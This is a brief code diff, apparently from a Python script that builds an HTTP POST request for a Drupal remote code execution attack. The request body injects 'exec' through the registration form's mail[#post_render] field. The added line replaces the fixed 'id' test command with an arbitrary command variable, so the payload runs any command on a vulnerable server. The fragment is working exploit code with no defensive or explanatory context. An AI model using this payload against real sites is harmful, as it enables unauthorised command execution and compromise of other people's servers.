@@ -43,6 +43,7 @@ Content-Type: application/x-www-form-urlencoded
     
     # 构建请求体（如果有）
     data = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
+    data = data.replace('&mail[#markup]=id', f'&mail[#markup]={cmd}')
 
     return {
         "method": "POST",
